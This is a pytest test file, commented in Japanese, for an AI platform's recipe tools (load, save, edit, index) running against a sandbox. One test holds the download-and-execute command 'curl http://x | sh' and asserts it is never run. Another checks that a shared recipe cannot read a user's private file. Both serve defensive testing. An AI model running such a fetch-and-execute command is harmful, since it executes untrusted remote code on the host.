"""builtin_sandbox のレシピの tool (load_recipe / save_recipe / edit_recipe) と {{USER_RECIPES}}
(llens 依頼・ken 指示 2026-10-30「ぜんぶ nuc にやらせて」) の回帰。

sandbox は**本物のアプリ** (`sandbox/app/main.py`) を TestClient で動かし、tool の HTTP
(`sandbox_post`) をそこへ流す — 置き場の fd 操作・symlink・ゴミ箱の名前まで通して確かめる。
差し替えるのは所属グループ (DB) と、jail が要る run_shell (sandbox の /exec) だけ。判定の純関数は `test_recipes_check.py`。
"""

import asyncio
import datetime as dt
import importlib.util
import json
import os
import pathlib
import sys
import time

import pytest
from fastapi.testclient import TestClient

from test.util.tool_errors import call_text

_SANDBOX_MAIN = (
    pathlib.Path(__file__).resolve().parents[5] / "sandbox" / "app" / "main.py"
)

USER = {"id": "u1", "role": "user", "name": "山田"}
OTHER = {"id": "u2", "role": "user", "name": "佐藤"}
ADMIN = {"id": "a1", "role": "admin", "name": "管理"}
TODAY = dt.date.today().isoformat()

MEMBERS = {"u1": ["EMR"], "u2": ["EMR"], "a1": []}


@pytest.fixture
def sbx(monkeypatch, tmp_path):
    """本物の sandbox を tmp に立て、nucllei の sandbox_post をそこへ繋ぐ。"""
    monkeypatch.setenv("SANDBOX_WORKSPACES", str(tmp_path / "workspaces"))
    monkeypatch.delenv("SANDBOX_TOKEN", raising=False)
    spec = importlib.util.spec_from_file_location(
        "sandbox_main_for_recipes", _SANDBOX_MAIN
    )
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    ws_root = tmp_path / "workspaces"

    async def fake_workspace(user_id):
        ws = ws_root / user_id
        ws.mkdir(parents=True, exist_ok=True)
        return ws

    monkeypatch.setattr(mod, "_workspace", fake_workspace)
    ext = tmp_path / "ext"
    (ext / "groups" / "EMR").mkdir(parents=True)
    (ext / "groups" / "OTHER").mkdir()
    (ext / "public").mkdir()
    monkeypatch.setattr(mod, "RO_MOUNT_ROOT", ext)
    monkeypatch.setattr(os, "chown", lambda *a, **k: None)
    monkeypatch.setattr(os, "fchown", lambda *a, **k: None)
    client = TestClient(mod.app)

    import nucllei.builtin_tools.sandbox as sb
    import nucllei.env
    import nucllei.utils.ext_acl as ext_acl
    import nucllei.utils.task as task

    calls = []

    async def fake_post(path, payload, timeout_s):
        calls.append(path)
        r = client.post(path, json=payload)
        if r.status_code != 200:
            raise sb.SandboxHTTPError(r.status_code, r.text)
        return r.json()

    monkeypatch.setattr(sb, "sandbox_post", fake_post)
    monkeypatch.setattr(nucllei.env, "SANDBOX_URL", "http://sandbox.test")
    monkeypatch.setattr(ext_acl, "member_group_names", lambda uid: MEMBERS.get(uid, []))
    monkeypatch.setattr(ext_acl, "all_group_names", lambda: ["EMR", "OTHER"])
    monkeypatch.setattr(task, "user_group_names", lambda uid: MEMBERS.get(uid, []))
    return {
        "ws": ws_root / "u1",
        "ext": ext,
        "calls": calls,
        "mod": mod,
    }


def _tool():
    from nucllei.builtin_tools.sandbox import Tools

    return Tools()


def run(coro):
    return asyncio.run(call_text(coro))


def _md(
    title="集計",
    description="月次の集計",
    author="山田",
    updated=None,
    extra="",
    body="1. 集める\n",
):
    return (
        f"---\ntitle: {title}\ndescription: {description}\nauthor: {author}\n"
        f"updated: {updated or TODAY}\n{extra}---\n\n{body}"
    )


def _put(base: pathlib.Path, name: str, md: str, **attachments):
    d = base / "recipes" / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "RECIPE.md").write_text(md, encoding="utf-8")
    for rel, content in attachments.items():
        (d / rel).write_text(content, encoding="utf-8")
    return d


def _recipes_text(user=USER):
    from nucllei.utils.recipe_index import user_recipes_text

    return asyncio.run(user_recipes_text(user))


# ---------------------------------------------------------------------------
# {{USER_RECIPES}}
# ---------------------------------------------------------------------------


def test_index_layers_order_and_member_groups_only(sbx):
    _put(sbx["ws"], "集計", _md())
    _put(
        sbx["ext"] / "groups" / "EMR",
        "抽出",
        _md(title="抽出", description='"EMR の抽出\\n2 行目"'),
    )
    _put(sbx["ext"] / "groups" / "OTHER", "秘密", _md())
    _put(sbx["ext"] / "public", "共通", _md(description="x" * 300))
    (sbx["ws"] / "recipes" / "trash").mkdir()
    (sbx["ws"] / "recipes" / ".tmp").mkdir()
    (sbx["ws"] / "recipes" / "散らばり.md").write_text("x")
    text = _recipes_text()
    lines = text.splitlines()
    assert lines[0] == "- /workspace/recipes/集計 — 月次の集計"
    assert lines[1] == "- /ext/groups/EMR/recipes/抽出 — EMR の抽出 2 行目"
    assert lines[2].startswith("- /ext/public/recipes/共通 — " + "x" * 100)
    assert lines[2].endswith("…") and len(lines[2].split(" — ", 1)[1]) == 120
    assert (
        len(lines) == 3
    )  # 所属外の OTHER・trash・. 始まり・散らばったファイルは出ない


def test_index_admin_sees_member_groups_only(sbx):
    _put(sbx["ext"] / "groups" / "EMR", "抽出", _md())
    _put(sbx["ext"] / "public", "共通", _md())
    text = _recipes_text(ADMIN)
    assert (
        "/ext/groups/EMR" not in text
    )  # 管理者でも所属分だけ ({{USER_GROUPS}} と同じ)
    assert "- /ext/public/recipes/共通 — 月次の集計" in text


def test_index_empty_is_empty_string(sbx):
    assert _recipes_text() == ""


def test_index_old_sandbox_and_unreachable(sbx, monkeypatch):
    import nucllei.builtin_tools.sandbox as sb
    from nucllei.utils.recipe_index import RECIPES_OLD_SANDBOX, RECIPES_UNREACHABLE

    async def old(path, payload, timeout_s):
        raise sb.SandboxHTTPError(404, '{"detail":"Not Found"}')

    monkeypatch.setattr(sb, "sandbox_post", old)
    assert _recipes_text() == RECIPES_OLD_SANDBOX

    async def down(path, payload, timeout_s):
        raise OSError("connection refused")

    monkeypatch.setattr(sb, "sandbox_post", down)
    assert _recipes_text() == RECIPES_UNREACHABLE


def test_index_broken_recipes_are_listed_with_reason(sbx):
    _put(sbx["ws"], "壊れ", "---\ntitle: a\n")
    _put(sbx["ws"], "キー無し", "---\ntitle: a\n---\nbody\n")
    (sbx["ws"] / "recipes" / "md無し").mkdir(parents=True)
    _put(
        sbx["ws"],
        "参照切れ",
        _md(
            extra="requires:\n  - read: notes.md\n  - shell: prep.sh --since 30d\n  - read: /workspace/無い.md\n"
        ),
    )
    lines = _recipes_text().splitlines()
    by = {ln.split(" — ")[0][2:]: ln.split(" — ", 1)[1] for ln in lines}
    assert by["/workspace/recipes/壊れ"] == (
        "(壊れている: frontmatter が閉じていない (2 つ目の --- の行が無い)。"
        "edit_recipe で直す (丸ごと書き直すなら save_recipe で上書き))"
    )
    assert (
        "必須キーが無い・空: description, author, updated"
        in by["/workspace/recipes/キー無し"]
    )
    assert by["/workspace/recipes/md無し"].startswith("(壊れている: RECIPE.md が無い。")
    # 参照先が無い・見えないは壊れているではなく警告 (description は出す — 読み込める)
    warned = by["/workspace/recipes/参照切れ"]
    assert warned.startswith("月次の集計 (警告: ")
    assert "requires の read /workspace/recipes/参照切れ/notes.md が無い" in warned
    assert "requires の shell の付属 prep.sh がフォルダに無い" in warned
    assert "ほか 1 件" in warned  # /workspace/無い.md も無い (3 件目)
    assert "壊れている" not in warned


def test_index_warning_disappears_when_reference_comes_back(sbx):
    """参照先を消す → 警告 → 戻す → 消える (警告は保存しない、毎回その場で)。"""
    notes = sbx["ext"] / "groups" / "EMR" / "notes"
    notes.mkdir()
    (notes / "検査結果.md").write_text("n")
    _put(
        sbx["ext"] / "groups" / "EMR",
        "抽出",
        _md(extra="requires:\n  - read: /ext/groups/EMR/notes/検査結果.md\n"),
    )
    assert _recipes_text() == "- /ext/groups/EMR/recipes/抽出 — 月次の集計"
    (notes / "検査結果.md").unlink()
    assert _recipes_text() == (
        "- /ext/groups/EMR/recipes/抽出 — 月次の集計 (警告: requires の read"
        " /ext/groups/EMR/notes/検査結果.md が無い。読み込めるが、その要素は実行しない)"
    )
    tool = _tool()
    out = run(
        tool.write_file("/ext/groups/EMR/notes/検査結果.md", "戻した", __user__=USER)
    )
    assert "書き込んだ" in out
    assert _recipes_text() == "- /ext/groups/EMR/recipes/抽出 — 月次の集計"


def test_index_is_two_sandbox_calls_and_fast(sbx):
    for i in range(60):
        _put(
            sbx["ws"],
            f"r{i:02d}",
            _md(extra=f"requires:\n  - read: /workspace/n{i}.md\n"),
        )
        (sbx["ws"] / f"n{i}.md").write_text("x")
    sbx["calls"].clear()
    t0 = time.perf_counter()
    text = _recipes_text()
    took = time.perf_counter() - t0
    assert len(text.splitlines()) == 60 and "壊れている" not in text
    assert "警告" not in text
    assert sbx["calls"] == ["/recipes/index", "/files/stat_many"]
    assert took < 2.0, took


def test_prompt_template_uses_prefetched_recipes(sbx):
    from nucllei.utils.task import (
        RECIPES_NOT_FETCHED,
        _user_recipes,
        ensure_user_recipes,
        prompt_template,
    )

    _put(sbx["ws"], "集計", _md())

    async def go():
        token = _user_recipes.set(None)
        try:
            tpl = "前\n{{USER_RECIPES}}\n後"
            before = prompt_template(tpl, user_id="u1")
            sbx["calls"].clear()
            await ensure_user_recipes(USER, "変数なし")
            assert sbx["calls"] == []  # 本文に無ければ sandbox に聞かない
            await ensure_user_recipes(USER, tpl)
            await ensure_user_recipes(USER, tpl)  # 1 リクエスト 1 回
            assert sbx["calls"] == ["/recipes/index"]
            return before, prompt_template(tpl, user_id="u1")
        finally:
            _user_recipes.reset(token)

    before, after = asyncio.run(go())
    assert before == f"前\n{RECIPES_NOT_FETCHED}\n後"
    assert after == "前\n- /workspace/recipes/集計 — 月次の集計\n後"


# ---------------------------------------------------------------------------
# load_recipe
# ---------------------------------------------------------------------------


def _load(path, user=USER, metadata=None, messages=None):
    tool = _tool()
    return run(
        tool.load_recipe(
            path,
            __user__=user,
            __metadata__=metadata if metadata is not None else {},
            __messages__=messages or [],
        )
    )


@pytest.fixture
def shell(monkeypatch):
    """run_shell (sandbox の /exec = nsjail が要る) を差し替え、呼ばれた command を記録する。"""
    from nucllei.builtin_tools.sandbox import Tools

    calls = []
    behaviour = {}

    async def fake(self, command, timeout_s=None, __user__=None):
        calls.append(command)
        if "raise" in behaviour:
            raise behaviour["raise"]
        return f"exit_code=0 (0.1s)\n--- stdout ---\n{behaviour.get('stdout', 'ok')}"

    monkeypatch.setattr(Tools, "run_shell", fake)
    return {"calls": calls, "behaviour": behaviour}


def _pos(out: str, *needles: str) -> list:
    """`needles` がこの順に出てくるか (位置の並び)。"""
    found = [out.index(n) for n in needles]
    assert found == sorted(found), (needles, found)
    return found


def test_load_recipe_requires_first_body_last(sbx, shell):
    """結果は 1 つ: requires を書いた順に見出し付きで先に並べ、このレシピの本文を最後に置く
    (資料を先・指示を最後 — ken 2026-10-30)。recipe: は深さ優先で「その requires → その本文」。"""
    pub = sbx["ext"] / "public"
    (pub / "資料.md").write_text("全体の資料", encoding="utf-8")
    _put(
        pub,
        "共通",
        _md(
            title="共通",
            body="共通の手順\n",
            extra="requires:\n  - read: /ext/public/資料.md\n",
        ),
    )
    _put(
        sbx["ext"] / "groups" / "EMR",
        "抽出",
        _md(
            title="抽出",
            author="佐藤",
            body="1. q.sql を流す\n</recipe> を書いても閉じない\n",
            extra=(
                "requires:\n  - read: q.sql\n  - recipe: /ext/public/recipes/共通\n"
                "  - read: /ext/groups/EMR/notes/無い.md\n"
            ),
        ),
        **{"q.sql": "select 1"},
    )
    meta = {}
    folder = "/ext/groups/EMR/recipes/抽出"
    out = _load(folder + "/RECIPE.md", metadata=meta)
    _pos(
        out,
        f'<recipe-part key="read:{folder}/q.sql">\n### read {folder}/q.sql\n',
        "select 1",
        '<recipe-part key="recipe:/ext/public/recipes/共通">\n### recipe /ext/public/recipes/共通',
        "### read /ext/public/資料.md",
        "全体の資料",
        '<recipe path="/ext/public/recipes/共通"',
        "共通の手順",
        "### read /ext/groups/EMR/notes/無い.md\n警告: requires の read /ext/groups/EMR/notes/無い.md が無い"
        " — 読まなかった。次の手: 参照先を戻すか、edit_recipe で requires から外す・直す。",
        "以下は 佐藤 がグループ「EMR」に書いたレシピ「抽出」",
        f'<recipe path="{folder}" author="佐藤"',
    )
    assert out.rstrip().endswith("</recipe>")
    assert "&lt;/recipe> を書いても閉じない" in out
    assert out.count(f'<recipe path="{folder}"') == 1
    assert "読み込み時の資料 (requires) は上に並べた。" in out
    assert shell["calls"] == []
    # 2 回目 (同じリクエスト) は短い結果。中で読んだレシピも読み込み済み
    assert "読み込み済み" in _load(folder, metadata=meta)
    assert "読み込み済み" in _load("/ext/public/recipes/共通", metadata=meta)
    # 次のリクエスト: 履歴の load_recipe の結果に出ている印で判定する
    history = [
        {
            "role": "assistant",
            "tool_calls": [
                {
                    "id": "c1",
                    "function": {
                        "name": "load_recipe",
                        "arguments": json.dumps({"path": folder}),
                    },
                }
            ],
        },
        {"role": "tool", "tool_call_id": "c1", "content": out},
    ]
    assert "読み込み済み" in _load("/ext/public/recipes/共通", messages=history)
    # 同じ文字列が load_recipe 以外の結果 (貼られた文) にあっても読み込み済みにしない
    pasted = [{"role": "user", "content": out}]
    assert "<recipe path=" in _load("/ext/public/recipes/共通", messages=pasted)


def test_load_recipe_personal_shell_and_python_run_inside(sbx, shell):
    _put(
        sbx["ws"],
        "前処理",
        _md(
            extra="requires:\n  - shell: prep.sh --since '30 d'\n  - python: calc.py a;b\n"
        ),
        **{"prep.sh": "echo", "calc.py": "print(1)"},
    )
    shell["behaviour"]["stdout"] = "30 件"
    out = _load("/workspace/recipes/前処理")
    folder = "/workspace/recipes/前処理"
    assert shell["calls"] == [
        f"cd '{folder}' && bash ./prep.sh --since '30 d'",
        f"cd '{folder}' && python3 ./calc.py 'a;b'",
    ]
    _pos(
        out,
        "### shell prep.sh --since '30 d' の出力\nexit_code=0 (0.1s)\n--- stdout ---\n30 件",
        "### python calc.py a;b の出力",
        f'<recipe path="{folder}"',
    )


def test_load_recipe_failed_part_is_one_line_and_continues(sbx, shell):
    from nucllei.utils.tool_errors import ToolFailure

    _put(
        sbx["ws"],
        "前処理",
        _md(extra="requires:\n  - shell: prep.sh\n  - read: a.md\n"),
        **{"prep.sh": "echo", "a.md": "A の中身"},
    )
    shell["behaviour"]["raise"] = ToolFailure(
        "実行がタイムアウトした", "短くして呼び直す。"
    )
    out = _load("/workspace/recipes/前処理")
    _pos(
        out,
        "<recipe-part>\n### shell prep.sh の出力\nERROR: 実行がタイムアウトした。次の手: 短くして呼び直す。",
        "A の中身",
        '<recipe path="/workspace/recipes/前処理"',
    )
    assert 'key="shell:' not in out  # 失敗した要素は「読み込み済み」の印を付けない


def test_load_recipe_layer_violation_warns_and_is_not_run(sbx, shell):
    """共有のレシピの requires で読む人の /workspace を読ませない: 層の規則の違反は警告で、その要素は
    実行しない (stat もしない)。frontmatter としては正しいので壊れているにはしない (ken 2026-10-30)。"""
    g = sbx["ext"] / "groups" / "EMR"
    (g / "a.md").write_text("A")
    _put(
        g,
        "記憶を読む",
        _md(
            extra=(
                "requires:\n  - read: /workspace/秘密.csv\n  - shell: prep.sh\n"
                "  - read: /ext/groups/EMR/a.md\n"
            )
        ),
        **{"prep.sh": "echo"},
    )
    sbx["ws"].mkdir(parents=True, exist_ok=True)
    (sbx["ws"] / "秘密.csv").write_text("SECRET-ROW")
    folder = "/ext/groups/EMR/recipes/記憶を読む"
    out = _load(folder)
    assert "SECRET-ROW" not in out and shell["calls"] == []
    _pos(
        out,
        "### read /workspace/秘密.csv\n警告: グループ「EMR」のレシピの requires の read では"
        " /workspace/秘密.csv を読まない (グループ「EMR」のレシピが読めるのはこのグループ・全体の置き場、"
        "このレシピのフォルダ、全員が読める /ext の置き場だけ) — 読まなかった。次の手: edit_recipe で"
        " requires から外す・直す (この置き場のレシピからは実行しない)。",
        "### shell prep.sh の出力\n警告: グループ「EMR」のレシピの requires では shell は使えない"
        " (共有の層では付属の実行は不可。使うなら個人のレシピから recipe: で読む)",
        "### read /ext/groups/EMR/a.md",
        f'<recipe path="{folder}"',
    )
    line = [ln for ln in _recipes_text().splitlines() if "記憶を読む" in ln][0]
    assert (
        "(警告: グループ「EMR」のレシピの requires の read では /workspace/秘密.csv を読まない"
        in line
    )
    assert "壊れている" not in line


def test_load_recipe_layer_violation_does_not_stat_reader_workspace(sbx, monkeypatch):
    import nucllei.utils.recipe_index as ri

    asked = []

    async def stat(user, paths):
        asked.extend(paths)
        return {}

    monkeypatch.setattr(ri, "stat_paths", stat)
    _put(
        sbx["ext"] / "groups" / "EMR",
        "記憶を読む",
        _md(
            extra="requires:\n  - read: /workspace/秘密.csv\n  - read: /ext/public/a.md\n"
        ),
    )
    _load("/ext/groups/EMR/recipes/記憶を読む")
    assert asked == ["/ext/public/a.md"]


def test_load_recipe_unknown_and_retired_keys_are_broken(sbx):
    _put(sbx["ws"], "旧形", _md(extra="on_load:\n  - read: a.md\ntools: query_emr\n"))
    out = _load("/workspace/recipes/旧形")
    assert out == (
        "ERROR: レシピ /workspace/recipes/旧形 は壊れている: frontmatter の知らないキー: on_load"
        " (使えるのは title・description・author・updated・requires)。on_load は requires に変わった、"
        "frontmatter の知らないキー: tools (使えるのは title・description・author・updated・requires)。"
        "tools は廃止 (使える人が限られる関数は本文の関数名で判定する)。"
        "次の手: edit_recipe で直す (丸ごと書き直すなら save_recipe で上書き)。"
    )
    _put(sbx["ws"], "skill入り", _md(extra="requires:\n  - skill: emr\n"))
    assert "skill は書けない (レシピから skill は読み込まない" in _load(
        "/workspace/recipes/skill入り"
    )
    assert "(壊れている: frontmatter の知らないキー: on_load" in _recipes_text()


def test_load_recipe_hidden_references_warn(sbx, monkeypatch):
    """所属していないグループのレシピ・使えない関数は「この利用者には使えない」警告。"""
    monkeypatch.setenv("RECIPE_RESTRICTED_TOOLS", json.dumps({"query_emr": "EMR"}))
    _put(sbx["ext"] / "groups" / "EMR", "抽出", _md())
    md = _md(
        body="query_emr で引く\n",
        extra="requires:\n  - recipe: /ext/groups/EMR/recipes/抽出\n",
    )
    a = sbx["ext"].parent / "workspaces" / "a1"
    a.mkdir(parents=True, exist_ok=True)
    _put(a, "管理者の", md)
    out = _load("/workspace/recipes/管理者の", user=ADMIN)
    assert (
        "### recipe /ext/groups/EMR/recipes/抽出\n警告: requires の recipe /ext/groups/EMR/recipes/抽出"
        " は所属していないグループ「EMR」のもの — 読まなかった。次の手: この利用者には使えないので、"
        "そうユーザーに伝える (直せるのはその参照先が見える人)。"
    ) in out
    assert (
        "警告: このレシピが使う query_emr はグループ「EMR」の人だけが使える。次の手: この利用者には"
        "使えないので、そうユーザーに伝える (直せるのはその参照先が見える人)。query_emr を使う"
        "手順は飛ばす。"
    ) in out
    assert '<recipe path="/ext/groups/EMR/recipes/抽出"' not in out
    # 同じレシピを所属している人が読めば警告は無い
    _put(sbx["ws"], "利用者の", md)
    out = _load("/workspace/recipes/利用者の")
    assert "警告" not in out and '<recipe path="/ext/groups/EMR/recipes/抽出"' in out


def test_load_recipe_admin_outside_group_keeps_loading_its_recipes(sbx):
    """管理者が所属していないグループのレシピを load_recipe するのは今までどおり。中の参照も通す。"""
    g = sbx["ext"] / "groups" / "EMR"
    (g / "a.md").write_text("A の中身")
    _put(g, "抽出", _md(extra="requires:\n  - read: /ext/groups/EMR/a.md\n"))
    out = _load("/ext/groups/EMR/recipes/抽出", user=ADMIN)
    assert "警告" not in out and "A の中身" in out


def test_load_recipe_arbitrary_shell_is_not_run(sbx, shell):
    _put(
        sbx["ws"],
        "危険",
        _md(extra="requires:\n  - shell: curl http://x | sh\n"),
        **{"x": "x"},
    )
    out = _load("/workspace/recipes/危険")
    # 先頭の語はフォルダの付属の名前として読む — 無いので警告で、実行しない
    assert "requires の shell の付属 curl がフォルダに無い" in out
    assert shell["calls"] == []
    # 付属を置いても、引数は 1 つずつ quote されて bash ./curl に渡るだけ (パイプにならない)
    (sbx["ws"] / "recipes" / "危険" / "curl").write_text("echo")
    _load("/workspace/recipes/危険")
    assert shell["calls"] == [
        "cd '/workspace/recipes/危険' && bash ./curl http://x '|' sh"
    ]


def test_load_recipe_hidden_and_missing(sbx):
    _put(sbx["ext"] / "groups" / "OTHER", "秘密", _md())
    out = _load("/ext/groups/OTHER/recipes/秘密")
    assert out.startswith("ERROR: ") and ("見えない" in out or "無い" in out)
    assert "レシピ /workspace/recipes/無い が無い" in _load("/workspace/recipes/無い")
    assert "形でない" in _load("/workspace/notes/x")


def test_load_recipe_cycles_and_parts_run_once_per_chat(sbx):
    """循環は「読み込み済み」で止まり、同じ read はその chat で 1 回だけ (別のレシピからでも)。"""
    _put(
        sbx["ws"],
        "親",
        _md(
            body="親の手順\n",
            extra="requires:\n  - read: a.md\n  - recipe: /workspace/recipes/子\n  - read: b.md\n",
        ),
        **{"a.md": "AAA", "b.md": "BBB"},
    )
    _put(
        sbx["ws"],
        "子",
        _md(
            body="子の手順\n",
            extra=(
                "requires:\n  - read: c.md\n  - recipe: /workspace/recipes/親\n"
                "  - read: /workspace/recipes/親/a.md\n"
            ),
        ),
        **{"c.md": "CCC"},
    )
    out = _load("/workspace/recipes/親")
    _pos(
        out,
        "AAA",
        "### recipe /workspace/recipes/子",
        "CCC",
        "### recipe /workspace/recipes/親\n(読み込み済み",
        "### read /workspace/recipes/親/a.md\n(読み込み済み",
        "子の手順",
        "BBB",
        "親の手順",
    )
    assert out.count("AAA") == 1
    # 次のリクエストで別のレシピが同じ a.md を読む → 読み込み済み
    _put(
        sbx["ws"],
        "孫",
        _md(extra="requires:\n  - read: /workspace/recipes/親/a.md\n"),
    )
    history = [
        {
            "role": "assistant",
            "content_blocks": [
                {
                    "type": "tool_calls",
                    "content": [
                        {
                            "id": "c1",
                            "function": {"name": "load_recipe", "arguments": "{}"},
                        }
                    ],
                    "results": [{"tool_call_id": "c1", "content": out}],
                }
            ],
        }
    ]
    again = _load("/workspace/recipes/孫", messages=history)
    assert "### read /workspace/recipes/親/a.md\n(読み込み済み" in again
    assert "AAA" not in again


def test_load_recipe_cuts_long_parts_but_keeps_the_body(sbx, monkeypatch):
    import nucllei.env

    monkeypatch.setattr(nucllei.env, "TOOL_RESULT_MAX_CHARS", 30000)
    _put(
        sbx["ws"],
        "長い",
        _md(
            body="最後の手順\n",
            extra="requires:\n  - read: a.txt\n  - read: b.txt\n  - read: c.txt\n",
        ),
        **{
            n: ch * 12000
            for n, ch in (("a.txt", "あ"), ("b.txt", "い"), ("c.txt", "う"))
        },
    )
    out = _load("/workspace/recipes/長い")
    assert len(out) <= 30000
    assert out.rstrip().endswith("最後の手順\n</recipe>")
    assert "…(ここで切った: この資料は " in out
    assert "続きは read_file('/workspace/recipes/長い/" in out


def test_skill_on_load_recipe_element_returns_one_result(sbx):
    """skill の on_load の `recipe:` (= load_recipe の tool の要素) は、その位置の 1 つの結果に
    requires と本文が入る (レシピの後続は積まない)。"""
    from nucllei.utils.skills import drain_load_skill_followups, make_followup_drain

    _put(sbx["ws"], "前処理", _md(extra="requires:\n  - read: a.md\n"), **{"a.md": "A"})
    tool = _tool()
    meta = {}

    async def execute(calls):
        out = []
        for call in calls:
            args = json.loads(call["function"]["arguments"])
            if call["function"]["name"] == "load_recipe":
                text = await call_text(
                    tool.load_recipe(
                        args["path"], __user__=USER, __metadata__=meta, __messages__=[]
                    )
                )
            else:
                text = "ok"
            out.append({"tool_call_id": call["id"], "content": text})
        return out

    entry = {
        "followups": [
            {
                "skill_id": "emr",
                "n": 0,
                "entry": {
                    "tool": "load_recipe",
                    "args": {"path": "/workspace/recipes/前処理"},
                },
            },
            {"skill_id": "emr", "n": 1, "entry": {"tool": "probe", "args": {}}},
        ]
    }
    tools = {"load_skill": entry, "load_recipe": {}, "probe": {}}

    async def go():
        drain = make_followup_drain(tools, meta, execute)
        return await drain_load_skill_followups(entry, tools, execute, drain=drain)

    calls, results = asyncio.run(go())
    assert [c["id"] for c in calls] == ["skill:emr:on_load:0", "skill:emr:on_load:1"]
    _pos(
        results[0]["content"],
        "### read /workspace/recipes/前処理/a.md",
        '<recipe path="/workspace/recipes/前処理"',
    )


# ---------------------------------------------------------------------------
# save_recipe
# ---------------------------------------------------------------------------


def _save(path, user=USER, **kw):
    return run(_tool().save_recipe(path, __user__=user, **kw))


def test_save_recipe_new_builds_frontmatter(sbx):
    out = _save(
        "/workspace/recipes/集計",
        title="集計",
        description="月次の集計",
        body="1. 集める\n2. 書く",
        requires=[{"read": "/workspace/notes.md"}],
    )
    assert (
        out.splitlines()[0]
        == "個人に置いた: /workspace/recipes/集計/ (本人だけが見られる)"
    )
    # 参照先が無くても書ける (警告を添える)
    assert (
        "警告: requires の read /workspace/notes.md が無い (読み込み時はこの要素を読まない)。"
        "次の手: 参照先を戻すか、edit_recipe で requires から外す・直す。"
    ) in out.splitlines()
    assert out.splitlines()[-1] == (
        "返答への指示: 置いた場所 (/workspace/recipes/集計/) と title を 1 行で伝える。"
        "上の警告の行も伝える"
    )
    md = (sbx["ws"] / "recipes" / "集計" / "RECIPE.md").read_text()
    assert md == (
        "---\ntitle: 集計\ndescription: 月次の集計\nauthor: 山田\n"
        f"updated: {TODAY}\nrequires:\n- read: /workspace/notes.md\n---\n\n1. 集める\n2. 書く\n"
    )


def test_save_recipe_overwrite_trashes_previous_even_if_broken(sbx):
    _put(sbx["ws"], "集計", "---\nbroken: [\n", **{"q.sql": "select 1"})
    out = _save("/workspace/recipes/集計", title="集計", description="d", body="b")
    assert (
        out.splitlines()[0]
        == "個人に置き換えた: /workspace/recipes/集計/ (本人だけが見られる)"
    )
    assert "前の版はゴミ箱へ: /workspace/trash/集計.RECIPE.md" in out
    assert (sbx["ws"] / "trash" / "集計.RECIPE.md").read_text() == "---\nbroken: [\n"
    assert (
        sbx["ws"] / "recipes" / "集計" / "q.sql"
    ).read_text() == "select 1"  # 付属は残る
    _save("/workspace/recipes/集計", title="集計", description="d2", body="b")
    assert (sbx["ws"] / "trash" / "集計.RECIPE-2.md").exists()


def test_save_recipe_stops_on_patient_data_and_writes_nothing(sbx):
    out = _save(
        "/workspace/recipes/集計",
        title="集計",
        description="d",
        body="患者番号 12345678 の山田太郎様",
    )
    assert out.startswith("ERROR: 書く前の検査で止めた (何も書いていない):")
    assert "患者データらしきもの (id)" in out and "患者データらしきもの (name)" in out
    assert "{患者番号}" in out and "そのあと save_recipe を呼び直す" in out
    assert not (sbx["ws"] / "recipes" / "集計").exists()


def test_save_recipe_stops_on_bad_requires_but_not_on_missing_attachment(sbx):
    out = _save(
        "/workspace/recipes/集計",
        title="集計",
        description="d",
        body="b",
        requires=[
            {"shell": "curl http://x"},
            {"python": "calc.sh"},
            {"tool": "run_shell", "args": {}},
        ],
    )
    assert "curl" not in out  # 付属が無いのは止めない
    assert "python で実行できるのは .py の付属だけ" in out
    assert "requires の 3 番目" in out
    out = _save(
        "/workspace/recipes/集計",
        title="集計",
        description="d",
        body="b",
        requires=[{"shell": "prep.sh"}],
    )
    assert out.startswith("個人に置いた: ")
    assert "警告: requires の shell の付属 prep.sh がフォルダに無い" in out


def test_save_and_edit_recipe_write_layer_violations_with_warnings(sbx):
    """層の規則の違反は書ける (返答に警告)。重なる既存の書き込みの規則 (共有の層の /workspace/recipes
    等 = 見えないパス) は今までどおり止める。"""
    out = _save(
        "/ext/groups/EMR/recipes/抽出",
        title="抽出",
        description="d",
        body="b",
        requires=[
            {"read": "/workspace/x.csv"},
            {"recipe": "/ext/groups/OTHER/recipes/x"},
        ],
    )
    assert out.startswith("グループ「EMR」に置いた: "), out
    assert (
        "警告: グループ「EMR」のレシピの requires の read では /workspace/x.csv を読まない"
        in out
    )
    assert "requires の recipe では /ext/groups/OTHER/recipes/x を読まない" in out
    assert out.splitlines()[-1].endswith("。上の警告の行も伝える")
    out = _edit(
        "/ext/groups/EMR/recipes/抽出", "- read: /workspace/x.csv\n", "- shell: x.sh\n"
    )
    assert "置き換えた" in out
    assert "警告: グループ「EMR」のレシピの requires では shell は使えない" in out
    out = _save(
        "/ext/groups/EMR/recipes/記憶",
        title="t",
        description="d",
        body="b",
        requires=[{"read": "/workspace/memory/記憶.md"}],
    )
    assert out.startswith("ERROR: 書く前の検査で止めた (何も書いていない):")
    assert "行き先の人には見えないパス: /workspace/memory/…" in out
    # 知らないキーを足す編集は frontmatter の規則で断る
    out = _edit(
        "/ext/groups/EMR/recipes/抽出", "title: 抽出\n", "title: 抽出\non_load: []\n"
    )
    assert out.startswith("ERROR: 直した後の検査で止めた (何も書いていない):")
    assert "frontmatter の知らないキー: on_load" in out and "requires に変わった" in out


def test_save_recipe_from_path_refuses_unknown_keys_of_source(sbx):
    _put(sbx["ws"], "元", _md(extra="memo: 旧 CLI のメモ\n"))
    out = _save("/ext/groups/EMR/recipes/元", from_path="/workspace/recipes/元")
    assert out == (
        "ERROR: 写し元 /workspace/recipes/元/RECIPE.md の frontmatter が壊れている (何も書いていない):\n"
        "  - frontmatter の知らないキー: memo (使えるのは title・description・author・updated・"
        "requires)。次の手: 写し元を edit_recipe で直してから save_recipe を呼び直す。"
    )
    assert not (sbx["ext"] / "groups" / "EMR" / "recipes" / "元").exists()


def test_save_recipe_shared_layer_checks_and_author(sbx, monkeypatch):
    monkeypatch.setenv(
        "RECIPE_RESTRICTED_TOOLS",
        json.dumps({"query_emr": "EMR", "monitoring_now": None}),
    )
    out = _save(
        "/ext/groups/EMR/recipes/抽出",
        title="抽出",
        description="d",
        body="query_emr を使う。/workspace/recipes/x/q.sql を読む",
    )
    assert "行き先の人には見えないパス" in out  # EMR には query_emr を置ける
    assert "query_emr を使うので" not in out
    out = _save(
        "/ext/public/recipes/抽出",
        user=ADMIN,
        title="抽出",
        description="d",
        body="query_emr を使う",
    )
    assert "本文が query_emr を使うので全体には置けない" in out
    out = _save("/ext/groups/EMR/recipes/共有", title="共有", description="d", body="b")
    assert "author: 山田" in out and out.splitlines()[-1].endswith(
        "title・author を 1 行で伝える"
    )
